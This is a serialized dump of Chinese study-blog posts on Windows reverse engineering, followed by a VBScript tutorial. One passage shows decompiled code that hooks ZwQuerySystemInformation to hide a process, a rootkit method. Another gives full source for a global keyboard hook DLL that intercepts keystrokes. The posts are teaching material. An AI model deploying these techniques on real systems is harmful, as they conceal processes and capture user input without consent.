HMODULE ModuleHandleA; // eax  FARPROC ZwQuerySystemInformation; // eax  int v7; // ebp  _DWORD *v8; // edi  _DWORD *v10; // [esp+10h] [ebp-10Ch]  CHAR MultiByteStr[260]; // [esp+14h] [ebp-108h] BYREF  v4 = a2;  memset(MultiByteStr, 0, sizeof(MultiByteStr));  sub_100010C0(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, (int)&amp;unk_1000AC60);  ModuleHandleA = GetModuleHandleA(&quot;ntdll.dll&quot;);  ZwQuerySystemInformation = GetProcAddress(ModuleHandleA, &quot;ZwQuerySystemInformation&quot;);  v7 = ((int (__stdcall *)(int, int, int, int))ZwQuerySystemInformation)(a1, a2, a3, a4);  if ( !v7 &amp;&amp; a1 == 5 )  &#123;    v8 = v10;    while ( 1 )    &#123;      WideCharToMultiByte(0, 0, *(LPCWCH *)(v4 + 60), -1, MultiByteStr, 260, 0, 0);      if ( !_stricmp(MultiByteStr, Destination) )      &#123;        if ( *(_DWORD *)v4 )          *v8 += *(_DWORD *)v4;        else          *v8 = 0;      &#125;      else      &#123;        v8 = (_DWORD *)v4;      &#125;      if ( !*(_DWORD *)v4 )        break;      v4 += *(_DWORD *)v4;    &#125;  &#125;  sub_10001000(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, (int)sub_10001120, (int)&amp;unk_1000AC60);  return v7;&#125;\n\n对NewZwQuerySystemInformation函数的结构说明如下：\n\n脱钩ZwQuerySystemInformation函数\n调用ZwQuerySystemInformation函数\n检查SYSTEM_PROCESS_INFORMATION结构体链表，查找要隐藏的进程\n查找到要隐藏的进程后，从链表中删除\n再次钩取ZwQuerySystemInformation\n\nNewZwQuerySystemInformation函数代码中有一个while语句，它用来检查SYSTEM_PROCESS_INFORMATION结构体链表，比较进程名称（pCur-&gt;Reserved2[1]）。\n参考链接https://blog.csdn.net/junbopengpeng/article/details/28142669\n","slug":"inline-Hook","date":"2022-03-24T09:39:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook","author_index":"0netry"},{"id":"f1607dee380ae8a16588d94dd0edba33","title":"消息Hook","content":"概念Windows操作系统向用户提供GUI，它以事件驱动方式工作。在操作系统中借助键盘、鼠标，选择菜单、按钮，以及移动鼠标、改变窗口大小与位置等都是事件。发生这样的事件时，OS会把事先定义好的消息发送给相应的应用程序，应用程序分析收到的信息后执行相应的动作。也就是说，敲击键盘时，消息会从OS移动到应用程序。所谓的消息钩子就是在此间偷看这些消息。\n先讲常规Windows消息流：\n\n发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]\nOS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中\n应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理\n\n\n如上图所示，OS消息队列与应用程序消息队列之间存在一条钩链（Hook Chain），设置好键盘消息钩子之后，处于钩链中的键盘消息钩子会比应用程序先看到相应信息。在键盘消息钩子函数的内部，除了可以查看消息之外，还可以修改消息本身，而且还能对消息实施拦截，阻止消息传递。\nSetWindowsHookEx()定义使用SetWindowsHookEx() API可以轻松实现消息钩子，其定义如下：\n123456789101112131415HHOOK SetWindowsHookExA(  [in] int       idHook,                        //hook type  [in] HOOKPROC  lpfn,                          //hook procedure  [in] HINSTANCE hmod,                          //hook procedure所属的DLL句柄（Handle）  [in] DWORD     dwThreadId                     //想要挂钩的线程id);HHOOK SetWindowsHookExW(  [in] int       idHook,  [in] HOOKPROC  lpfn,  [in] HINSTANCE hmod,  [in] DWORD     dwThreadId);//参考：https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowshookexa\n\n钩子过程（hook procedure）是由操作系统调用的回调函数。安装消息钩子时，钩子过程需要存在于某个DLL内部，且该DLL的实例句柄即是hMod。\n\n\n\n\n\n\n\n\n\n若dwThreadId参数被设置为0，则安装的钩子为全局钩子，它会影响到运行中的（以及以后要运行的）所有进程。\n像这样，使用SetWindowsHookEx() 设置好消息钩子后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入相应进程，然后调用注册的钩子过程。注入进程时用户几乎不需要做什么。\n参数[in] idHook要安装的挂钩过程的类型。 此参数的取值可为下列值之一：\n\n\n\n值\n含义\n\n\n\nWH_CALLWNDPROC（4）\n安装一个挂钩过程，用于在系统将消息发送到目标窗口过程之前监视消息。 有关详细信息，请参阅 CallWindowProcW 函数&#x2F;CallWindowProcA 函数 挂钩过程。\n\n\nWH_CALLWNDPROCRET（12）\n安装一个挂钩过程，该过程在目标窗口过程处理消息后监视消息。 有关详细信息，请参阅 [HOOKPROC 回调函数] (nc-winuser-hookproc.md) 挂钩过程。\n\n\nWH_CBT（5）\n安装用于接收对 CBT 应用程序有用的通知的挂钩过程。 有关详细信息，请参阅 CBTProc 挂钩过程。\n\n\nWH_DEBUG（9）\n安装可用于调试其他挂钩过程的挂钩过程。 有关详细信息，请参阅 DebugProc 挂钩过程。\n\n\nWH_FOREGROUNDIDLE（11）\n安装将在应用程序的前台线程变为空闲状态时调用的挂钩过程。 此挂钩可用于在空闲时间执行低优先级任务。 有关详细信息，请参阅 ForegroundIdleProc 挂钩过程。\n\n\nWH_GETMESSAGE（3）\n安装用于监视发布到消息队列的消息的挂钩过程。 有关详细信息，请参阅 GetMsgProc 挂钩过程。\n\n\nWH_JOURNALPLAYBACK（1）\n警告Windows 11及更新版本：不支持日记挂钩 API。 建议改用 SendInput TextInput API。安装一个挂钩过程，该过程发布以前由 WH_JOURNALRECORD 挂钩过程记录的消息。 有关详细信息，请参阅 JournalPlaybackProc 挂钩过程。\n\n\nWH_JOURNALRECORD（0）\n警告Windows 11及更新版本：不支持日记挂钩 API。 建议改用 SendInput TextInput API。安装一个挂钩过程，用于记录发布到系统消息队列的输入消息。 此挂钩可用于记录宏。 有关详细信息，请参阅 JournalRecordProc 挂钩过程。\n\n\nWH_KEYBOARD（2）\n安装用于监视击键消息的挂钩过程。 有关详细信息，请参阅 KeyboardProc 挂钩过程。\n\n\nWH_KEYBOARD_LL（13）\n安装用于监视低级别键盘输入事件的挂钩过程。 有关详细信息，请参阅 [LowLevelKeyboardProc] (&#x2F;windows&#x2F;win32&#x2F;winmsg&#x2F;lowlevelkeyboardproc) 挂钩过程。\n\n\nWH_MOUSE（7）\n安装监视鼠标消息的挂钩过程。 有关详细信息，请参阅 MouseProc 挂钩过程。\n\n\nWH_MOUSE_LL（14）\n安装用于监视低级别鼠标输入事件的挂钩过程。 有关详细信息，请参阅 LowLevelMouseProc 挂钩过程。\n\n\nWH_MSGFILTER（-1）\n安装挂钩过程，用于监视由于对话框、消息框、菜单或滚动条中的输入事件而生成的消息。 有关详细信息，请参阅 MessageProc 挂钩过程。\n\n\nWH_SHELL（10）\n安装一个挂钩过程，用于接收对 shell 应用程序有用的通知。 有关详细信息，请参阅 ShellProc 挂钩过程。\n\n\nWH_SYSMSGFILTER（6）\n安装挂钩过程，用于监视由于对话框、消息框、菜单或滚动条中的输入事件而生成的消息。 挂钩过程监视与调用线程位于同一桌面中的所有应用程序的消息。 有关详细信息，请参阅 SysMsgProc 挂钩过程。\n\n\n[in] lpfn指向挂钩过程的指针。 如果 dwThreadId 参数为零或指定由其他进程创建的线程的标识符， 则 lpfn 参数必须指向 DLL 中的挂钩过程。 否则， lpfn 可以指向与当前进程关联的代码中的挂钩过程。\n该指针指向的函数，根据 idHook的值来定，具体见上表\n[in] hmodDLL 的句柄，其中包含 lpfn 参数指向的挂钩过程。 如果 dwThreadId 参数指定当前进程创建的线程，并且挂钩过程位于与当前进程关联的代码中，则必须将 hMod 参数设置为 NULL。\n[in] dwThreadId要与挂钩过程关联的线程的标识符。 对于桌面应用，如果此参数为零，则挂钩过程与调用线程在同一桌面中运行的所有现有线程相关联。\n返回值类型： HHOOK\n如果函数成功，则返回值是挂钩过程的句柄。\n如果函数失败，则返回值为 NULL。 要获得更多的错误信息，请调用 GetLastError。\n练习本例使用键盘钩取技术，拦截notepad.exe进程的键盘消息，使之无法显示在记事本中。\nKeyHook.dll文件是一个含有钩子过程的DLL文件。HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll文件后使用SetWindowsHookEx()安装键盘钩子（KeyboardProc()）。若其他进程中发生键盘输入事件，OS就会强制将KeyHook.dll加载到相应进程的内存，然后调用KeyboardProc()函数。\nHookMain.cpp源码分析HookMain.exe先加载KeyHook.dll文件，然后调用HookStart()函数开始钩取，用户输入’q’时，调用HookStop()函数终止钩取。\n12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define\tDEF_DLL_NAME\t\t&quot;KeyHook.dll&quot;#define\tDEF_HOOKSTART\t\t&quot;HookStart&quot;#define\tDEF_HOOKSTOP\t\t&quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123;\tHMODULE\t\t\thDll = NULL;\tPFN_HOOKSTART\tHookStart = NULL;\tPFN_HOOKSTOP\tHookStop = NULL;\tchar\t\t\tch = 0;    //加载KeyHook.dll\thDll = LoadLibraryA(DEF_DLL_NAME);    if( hDll == NULL )    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;    //获取导出函数地址\tHookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\tHookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);    //开始钩取\tHookStart();    //等待直到用户输入&#x27;q&#x27;\tprintf(&quot;press &#x27;q&#x27; to quit!\\n&quot;);\twhile( _getch() != &#x27;q&#x27; )\t;    //终止钩取\tHookStop();\t    //卸载KeyHook.dll\tFreeLibrary(hDll);&#125;\n\nKeyHook.cpp源码分析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME\t\t&quot;notepad.exe&quot;HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL;HWND g_hWnd = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;\tswitch( dwReason )\t&#123;        case DLL_PROCESS_ATTACH:\t\t\tg_hInstance = hinstDLL;\t\t\tbreak;        case DLL_PROCESS_DETACH:\t\t\tbreak;\t\t&#125;\treturn TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;\tchar szPath[MAX_PATH] = &#123;0,&#125;;\tchar *p = NULL;\tif( nCode &gt;= 0 )\t&#123;\t\t// bit 31 : 0 =&gt; key press, 1 =&gt; key release\t\tif( !(lParam &amp; 0x80000000) ) //释放键盘按键时\t\t&#123;\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\t\t\tp = strrchr(szPath, &#x27;\\\\&#x27;);            // 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或下一个钩子）\t\t\tif( !_stricmp(p + 1, DEF_PROCESS_NAME) )\t\t\t\treturn 1;\t\t&#125;\t&#125;    //若非notepad.exe，则调用CallNextHookEx()函数    //将消息传递给应用程序（或下一个钩子）\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif\t__declspec(dllexport) void HookStart()\t&#123;\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\t&#125;\t__declspec(dllexport) void HookStop()\t&#123;\t\tif( g_hHook )\t\t&#123;\t\t\tUnhookWindowsHookEx(g_hHook);\t\t\tg_hHook = NULL;\t\t&#125;\t&#125;#ifdef __cplusplus&#125;#endif\n\nDLL的代码很简单，调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。\nKeyboardProc()当SetWindowsHookEx()函数的第一个参数为WH_KEYBOARD（2）时，就会安装监视键盘消息的挂钩过程（KeyboardProc()）。\n安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS就会强制将KeyHook.dll注入相应进程。加载了KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc()。\nKeyboardProc()函数中发生键盘输入事件时，就会比较当前进程的名称是否为notepad.exe，若是，则返回1，终止KeyboardProc()函数，这意味着截获并删除消息。这样键盘消息就不会传递到notepad.exe程序的消息队列。\n除此之外（即当前进程非notepad.exe），执行return CallNextHookEx(g_hHook, nCode, wParam, lParam);语句，消息会被传递到另一个应用程序或钩链的另一个钩子函数。\nKeyboardProc()的定义12345LRESULT CALLBACK KeyboardProc(  _In_ int    code,  _In_ WPARAM wParam,  _In_ LPARAM lParam);\n\nKeyboardProc()的参数\ncode\n挂钩过程用于确定如何处理消息的代码。如果 代码 小于零，挂钩过程必须将消息传递给 CallNextHookEx 函数，而无需进一步处理，并且应返回 CallNextHookEx 返回的值。\n其取值有HC_ACTION（0）或HC_NOREMOVE（3）\n\nwParam\n生成 击键 消息的密钥的虚拟密钥代码。其值有如下内容：\n参考：https://learn.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes\n\n\n\n常数\nValue\n说明\n\n\n\nVK_LBUTTON\n0x01\n鼠标左键\n\n\nVK_RBUTTON\n0x02\n鼠标右键\n\n\nVK_CANCEL\n0x03\n控制中断处理\n\n\nVK_MBUTTON\n0x04\n鼠标中键\n\n\nVK_XBUTTON1\n0x05\nX1 鼠标按钮\n\n\nVK_XBUTTON2\n0x06\nX2 鼠标按钮\n\n\n-\n0x07\n保留\n\n\nVK_BACK\n0x08\nBACKSPACE 键\n\n\nVK_TAB\n0x09\nTab 键\n\n\n-\n0x0A-0B\n预留\n\n\nVK_CLEAR\n0x0C\nCLEAR 键\n\n\nVK_RETURN\n0x0D\nEnter 键\n\n\n-\n0x0E-0F\n未分配\n\n\nVK_SHIFT\n0x10\nSHIFT 键\n\n\nVK_CONTROL\n0x11\nCTRL 键\n\n\nVK_MENU\n0x12\nAlt 键\n\n\nVK_PAUSE\n0x13\nPAUSE 键\n\n\nVK_CAPITAL\n0x14\nCAPS LOCK 键\n\n\nVK_KANA\n0x15\nIME Kana 模式\n\n\nVK_HANGUL\n0x15\nIME Hanguel 模式\n\n\nVK_IME_ON\n0x16\nIME 打开\n\n\nVK_JUNJA\n0x17\nIME Junja 模式\n\n\nVK_FINAL\n0x18\nIME 最终模式\n\n\nVK_HANJA\n0x19\nIME Hanja 模式\n\n\nVK_KANJI\n0x19\nIME Kanji 模式\n\n\nVK_IME_OFF\n0x1A\nIME 关闭\n\n\nVK_ESCAPE\n0x1B\nESC 键\n\n\nVK_CONVERT\n0x1C\nIME 转换\n\n\nVK_NONCONVERT\n0x1D\nIME 不转换\n\n\nVK_ACCEPT\n0x1E\nIME 接受\n\n\nVK_MODECHANGE\n0x1F\nIME 模式更改请求\n\n\nVK_SPACE\n0x20\n空格键\n\n\nVK_PRIOR\n0x21\nPAGE UP 键\n\n\nVK_NEXT\n0x22\nPAGE DOWN 键\n\n\nVK_END\n0x23\nEND 键\n\n\nVK_HOME\n0x24\nHOME 键\n\n\nVK_LEFT\n0x25\nLEFT ARROW 键\n\n\nVK_UP\n0x26\nUP ARROW 键\n\n\nVK_RIGHT\n0x27\nRIGHT ARROW 键\n\n\nVK_DOWN\n0x28\nDOWN ARROW 键\n\n\nVK_SELECT\n0x29\nSELECT 键\n\n\nVK_PRINT\n0x2A\nPRINT 键\n\n\nVK_EXECUTE\n0x2B\nEXECUTE 键\n\n\nVK_SNAPSHOT\n0x2C\nPRINT SCREEN 键\n\n\nVK_INSERT\n0x2D\nINS 键\n\n\nVK_DELETE\n0x2E\nDEL 键\n\n\nVK_HELP\n0x2F\nHELP 键\n\n\n\n0x30\n0 键\n\n\n\n0x31\n1 个键\n\n\n\n0x32\n2 键\n\n\n\n0x33\n3 键\n\n\n\n0x34\n4 键\n\n\n\n0x35\n5 键\n\n\n\n0x36\n6 键\n\n\n\n0x37\n7 键\n\n\n\n0x38\n8 键\n\n\n\n0x39\n9 键\n\n\n-\n0x3A-40\nUndefined\n\n\n\n0x41\nA 键\n\n\n\n0x42\nB 键\n\n\n\n0x43\nC 键\n\n\n\n0x44\nD 键\n\n\n\n0x45\nE 键\n\n\n\n0x46\nF 键\n\n\n\n0x47\nG 键\n\n\n\n0x48\nH 键\n\n\n\n0x49\nI 键\n\n\n\n0x4A\nJ 键\n\n\n\n0x4B\nK 键\n\n\n\n0x4C\nL 键\n\n\n\n0x4D\nM 键\n\n\n\n0x4E\nN 键\n\n\n\n0x4F\nO 键\n\n\n\n0x50\nP 键\n\n\n\n0x51\nQ 键\n\n\n\n0x52\nR 键\n\n\n\n0x53\nS 键\n\n\n\n0x54\nT 键\n\n\n\n0x55\nU 键\n\n\n\n0x56\nV 键\n\n\n\n0x57\nW 键\n\n\n\n0x58\nX 键\n\n\n\n0x59\nY 键\n\n\n\n0x5A\nZ 键\n\n\nVK_LWIN\n0x5B\n左 Windows 键\n\n\nVK_RWIN\n0x5C\n右侧 Windows 键\n\n\nVK_APPS\n0x5D\n应用程序密钥\n\n\n-\n0x5E\n预留\n\n\nVK_SLEEP\n0x5F\n计算机休眠键\n\n\nVK_NUMPAD0\n0x60\n数字键盘 0 键\n\n\nVK_NUMPAD1\n0x61\n数字键盘 1 键\n\n\nVK_NUMPAD2\n0x62\n数字键盘 2 键\n\n\nVK_NUMPAD3\n0x63\n数字键盘 3 键\n\n\nVK_NUMPAD4\n0x64\n数字键盘 4 键\n\n\nVK_NUMPAD5\n0x65\n数字键盘 5 键\n\n\nVK_NUMPAD6\n0x66\n数字键盘 6 键\n\n\nVK_NUMPAD7\n0x67\n数字键盘 7 键\n\n\nVK_NUMPAD8\n0x68\n数字键盘 8 键\n\n\nVK_NUMPAD9\n0x69\n数字键盘 9 键\n\n\nVK_MULTIPLY\n0x6A\n乘号键\n\n\nVK_ADD\n0x6B\n加号键\n\n\nVK_SEPARATOR\n0x6C\n分隔符键\n\n\nVK_SUBTRACT\n0x6D\n减号键\n\n\nVK_DECIMAL\n0x6E\n句点键\n\n\nVK_DIVIDE\n0x6F\n除号键\n\n\nVK_F1\n0x70\nF1 键\n\n\nVK_F2\n0x71\nF2 键\n\n\nVK_F3\n0x72\nF3 键\n\n\nVK_F4\n0x73\nF4 键\n\n\nVK_F5\n0x74\nF5 键\n\n\nVK_F6\n0x75\nF6 键\n\n\nVK_F7\n0x76\nF7 键\n\n\nVK_F8\n0x77\nF8 键\n\n\nVK_F9\n0x78\nF9 键\n\n\nVK_F10\n0x79\nF10 键\n\n\nVK_F11\n0x7A\nF11 键\n\n\nVK_F12\n0x7B\nF12 键\n\n\nVK_F13\n0x7C\nF13 键\n\n\nVK_F14\n0x7D\nF14 键\n\n\nVK_F15\n0x7E\nF15 键\n\n\nVK_F16\n0x7F\nF16 键\n\n\nVK_F17\n0x80\nF17 键\n\n\nVK_F18\n0x81\nF18 键\n\n\nVK_F19\n0x82\nF19 键\n\n\nVK_F20\n0x83\nF20 键\n\n\nVK_F21\n0x84\nF21 键\n\n\nVK_F22\n0x85\nF22 键\n\n\nVK_F23\n0x86\nF23 键\n\n\nVK_F24\n0x87\nF24 键\n\n\n-\n0x88-8F\n保留\n\n\nVK_NUMLOCK\n0x90\nNUM LOCK 键\n\n\nVK_SCROLL\n0x91\nSCROLL LOCK 键\n\n\n-\n0x92-96\nOEM 特有\n\n\n-\n0x97-9F\n未分配\n\n\nVK_LSHIFT\n0xA0\n左 SHIFT 键\n\n\nVK_RSHIFT\n0xA1\n右 SHIFT 键\n\n\nVK_LCONTROL\n0xA2\n左 Ctrl 键\n\n\nVK_RCONTROL\n0xA3\n右 Ctrl 键\n\n\nVK_LMENU\n0xA4\n左 ALT 键\n\n\nVK_RMENU\n0xA5\n右 ALT 键\n\n\nVK_BROWSER_BACK\n0xA6\n浏览器后退键\n\n\nVK_BROWSER_FORWARD\n0xA7\n浏览器前进键\n\n\nVK_BROWSER_REFRESH\n0xA8\n浏览器刷新键\n\n\nVK_BROWSER_STOP\n0xA9\n浏览器停止键\n\n\nVK_BROWSER_SEARCH\n0xAA\n浏览器搜索键\n\n\nVK_BROWSER_FAVORITES\n0xAB\n浏览器收藏键\n\n\nVK_BROWSER_HOME\n0xAC\n浏览器“开始”和“主页”键\n\n\nVK_VOLUME_MUTE\n0xAD\n静音键\n\n\nVK_VOLUME_DOWN\n0xAE\n音量减小键\n\n\nVK_VOLUME_UP\n0xAF\n音量增加键\n\n\nVK_MEDIA_NEXT_TRACK\n0xB0\n下一曲目键\n\n\nVK_MEDIA_PREV_TRACK\n0xB1\n上一曲目键\n\n\nVK_MEDIA_STOP\n0xB2\n停止媒体键\n\n\nVK_MEDIA_PLAY_PAUSE\n0xB3\n播放&#x2F;暂停媒体键\n\n\nVK_LAUNCH_MAIL\n0xB4\n启动邮件键\n\n\nVK_LAUNCH_MEDIA_SELECT\n0xB5\n选择媒体键\n\n\nVK_LAUNCH_APP1\n0xB6\n启动应用程序 1 键\n\n\nVK_LAUNCH_APP2\n0xB7\n启动应用程序 2 键\n\n\n-\n0xB8-B9\n预留\n\n\nVK_OEM_1\n0xBA\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键;:\n\n\nVK_OEM_PLUS\n0xBB\n对于任何国家&#x2F;地区，键+\n\n\nVK_OEM_COMMA\n0xBC\n对于任何国家&#x2F;地区，键,\n\n\nVK_OEM_MINUS\n0xBD\n对于任何国家&#x2F;地区，键-\n\n\nVK_OEM_PERIOD\n0xBE\n对于任何国家&#x2F;地区，键.\n\n\nVK_OEM_2\n0xBF\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键/?\n\n\nVK_OEM_3\n0xC0\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键&#96;&#96;~&#96;\n\n\n-\n0xC1-DA\n保留\n\n\nVK_OEM_4\n0xDB\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键[&#123;\n\n\nVK_OEM_5\n0xDC\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键&#96;\\\n\n\nVK_OEM_6\n0xDD\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键]&#125;\n\n\nVK_OEM_7\n0xDE\n用于杂项字符；它可能因键盘而异。 对于美国标准键盘，键&#39;&quot;\n\n\nVK_OEM_8\n0xDF\n用于杂项字符；它可能因键盘而异。\n\n\n-\n0xE0\n预留\n\n\n-\n0xE1\nOEM 特有\n\n\nVK_OEM_102\n0xE2\n美国标准键盘上的 &lt;&gt; 键，或非美国 102 键键盘上的 &#96;\\\n\n\n-\n0xE3-E4\nOEM 特有\n\n\nVK_PROCESSKEY\n0xE5\nIME PROCESS 键\n\n\n-\n0xE6\nOEM 特有\n\n\nVK_PACKET\n0xE7\n用于将 Unicode 字符当作键击传递。 VK_PACKET 键是用于非键盘输入法的 32 位虚拟键值的低位字。 有关更多信息，请参阅 KEYBDINPUT、SendInput、WM_KEYDOWN 和 WM_KEYUP 中的注释\n\n\n-\n0xE8\n未分配\n\n\n-\n0xE9-F5\nOEM 特有\n\n\nVK_ATTN\n0xF6\nAttn 键\n\n\nVK_CRSEL\n0xF7\nCrSel 键\n\n\nVK_EXSEL\n0xF8\nExSel 键\n\n\nVK_EREOF\n0xF9\nErase EOF 键\n\n\nVK_PLAY\n0xFA\nPlay 键\n\n\nVK_ZOOM\n0xFB\nZoom 键\n\n\nVK_NONAME\n0xFC\n预留\n\n\nVK_PA1\n0xFD\nPA1 键\n\n\nVK_OEM_CLEAR\n0xFE\nClear 键\n\n\n\nlParam\n\n\n​            重复计数、扫描代码、扩展键标志、上下文代码、以前的键状态标志和转换状态标志。  有关 lParam 参数的详细信息，请参阅 击键消息标志。下表描述了此值的位。\n\n\n\nBits\n说明\n\n\n\n0-15\n重复计数。 该值是用户按住键后重复击键的次数。\n\n\n16-23\n扫描代码。 此值取决于 OEM。\n\n\n24\n指示键是扩展键，例如功能键还是数字键盘上的键。 如果键是扩展键，则值为 1;否则为 0。\n\n\n25-28\n保留。\n\n\n29\n上下文代码。 如果 Alt 键关闭，则值为 1;否则为 0。\n\n\n30\n上一个键状态。 如果在发送消息之前键关闭，则值为 1;如果键已打开，则为 0。\n\n\n31\n转换状态。 如果按下键，则值为 0;如果释放键，则值为 1。\n\n\n下图显示了这些标志和值在 lParam 参数中的位置。\n\n应用程序可以使用以下值从 lParam 的高位字中获取击键标志。\n\n\n\n值\n说明\n\n\n\nKF_EXTENDED 0x0100\n操作扩展键标志。\n\n\nKF_DLGMODE 0x0800\n操作对话框模式标志，该标志指示对话框是否处于活动状态。\n\n\nKF_MENUMODE 0x1000\n操作菜单模式标志，该标志指示菜单是否处于活动状态。\n\n\nKF_ALTDOWN 0x2000\n操作上下文代码标志。\n\n\nKF_REPEAT 0x4000\n操作上一个键状态标志。\n\n\nKF_UP 0x8000\n操作转换状态标志。\n\n\nKeyboardProc()的返回值如果 代码 小于零，挂钩过程必须返回 CallNextHookEx 返回的值。\n如果 代码 大于或等于零，并且挂钩过程未处理消息，强烈建议调用 CallNextHookEx 并返回它返回的值;否则，安装 WH_KEYBOARD 挂钩的其他应用程序将不会收到挂钩通知，因此行为可能不正确。\n如果挂钩过程处理了消息，它可能会返回非零值，以防止系统将消息传递给挂钩链的其余部分或目标窗口过程。\n","slug":"消息Hook","date":"2022-03-20T05:39:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理","author_index":"0netry"},{"id":"28df775ed85d265dbcba7f21d8f65afc","title":"VBScript教程","content":"VBScript 变量VBScript 变量VBScript 变量用于保存值或表达式。\n变量可以有一个短的名称，如 x，或一个更具描述性的名称，如 carname。\nVBScript 变量名称的规则：\n\n必须以字母开头\n不能包含点号（.）\n不能超过 255 个字符\n\n在 VBScript 中，所有的变量都与类型 variant 相关，可存储不同类型的数据。\n\n声明（创建）VBScript 变量在 VBScript 创建变量通常指”声明”变量。\n可以通过 Dim、Public 或 Private 语句声明 VBScript 变量。如下所示：\n12Dim xDim carname\n\n也可以在脚本中通过使用它的名称来声明变量。如下所示：\n1carname=&quot;Volvo&quot;\n\n现在又创建了一个变量。变量的名称是 “carname”。但是这个做法不是一个好习惯，因为可能会在脚本中拼错变量名，那样可能会在脚本运行时引起奇怪的结果。\n如果拼错变量名，比如 “carname” 变量错拼为 “carnime”，脚本会自动创建一个名为 “carnime” 的新变量。为了防止脚本这样做，可以使用 Option Explicit 语句。如果使用这个语句，就必须使用 dim、public 或 private 语句来声明所有的变量。\n把 Option Explicit 语句放置于脚本的顶端，如下所示：\n123Option ExplicitDim carnamecarname=some value\n\n\n\n\n为变量赋值可以为某个变量赋值，如下所示：\n12carname=&quot;Volvo&quot;x=10\n\n变量名是在表达式的左侧，需要赋给变量的值在表达式的右侧。现在变量 “carname” 的值是 “Volvo”，变量 “x” 的值是 “10”。\n\n变量的生存期变量的生存期指的是它可以存在的时长。\n当在一个子程序中声明变量时，变量只能在此程序内进行访问。当退出此程序时，变量也会失效。这样的变量称为本地变量。可以在不同的子程序中使用名称相同的本地变量，因为每个变量只能在声明它的程序内得到识别。\n如果在子程序以外声明了一个变量，在页面上的所有子程序都可以访问它。这类变量的生存期始于它们被声明，止于页面被关闭。\n\nVBScript 数组变量数组变量用于在一个单一的变量中存储多个值。\n在下面的实例中，声明了一个包含 3 个元素的数组：\n1Dim names(2)\n\n括号内显示的数字是 2。数组的下标以 0 开始，因此该数组包含 3 个元素。这是容量固定的数组。可以为数组的每个元素分配数据，如下所示：\n123names(0)=&quot;Tove&quot;names(1)=&quot;Jani&quot;names(2)=&quot;Stale&quot;\n\n同样地，通过使用特定数组元素的下标号，可以取回任何元素的值。如下所示：\n1mother=names(0)\n\n可以在一个数组中使用多达 60 个维数。声明多维数组的方法是在括号中用逗号来分隔数字。以下例子声明了一个包含 5 行 7 列的 2 维数组：\n1Dim table(4,6)\n\n为二维数组赋值：\n实例（仅适用于 IE）1234567891011121314151617181920212223242526&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/vbscript&quot;&gt;Dim x(2,2)x(0,0)=&quot;Volvo&quot;x(0,1)=&quot;BMW&quot;x(0,2)=&quot;Ford&quot;x(1,0)=&quot;Apple&quot;x(1,1)=&quot;Orange&quot;x(1,2)=&quot;Banana&quot;x(2,0)=&quot;Coke&quot;x(2,1)=&quot;Pepsi&quot;x(2,2)=&quot;Sprite&quot;for i=0 to 2document.write(&quot;&lt;p&gt;&quot;)for j=0 to 2document.write(x(i,j) &amp; &quot;&lt;br /&gt;&quot;)nextdocument.write(&quot;&lt;/p&gt;&quot;)next&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nVBScript 程序\nVBScript 可使用两种程序：\n\n子程序\n函数程序\n\n\nVBScript 子程序子程序：\n\n是一系列的语句，被封装在 Sub 和 End Sub 语句内\n可执行某些操作，但不会返回值\n可带有参数\n\n123Sub mysub()some statementsEnd Sub\n\n或者\n123Sub mysub(argument1,argument2)some statementsEnd Sub\n\n\n\n实例（仅适用于 IE）123Sub mysub()document.write(&quot;I was written by a sub procedure&quot;)End Sub\n\n\n\n\nVBScript 函数程序函数程序\n\n是一系列的语句，被封装在 Function 和 End Function 语句内\n可执行某些操作，并会返回值\n可带有通过程序调用来向其传递的参数。\n如果没有参数，必须带有空的圆括号 ()\n通过向函数程序名赋值的方式，可使其返回值\n\n1234Function myfunction()some statementsmyfunction=some valueEnd Function\n\n或者\n1234Function myfunction(argument1,argument2)some statementsmyfunction=some valueEnd Function\n\n\n\n实例（仅适用于 IE）123function myfunction()myfunction=Date()end 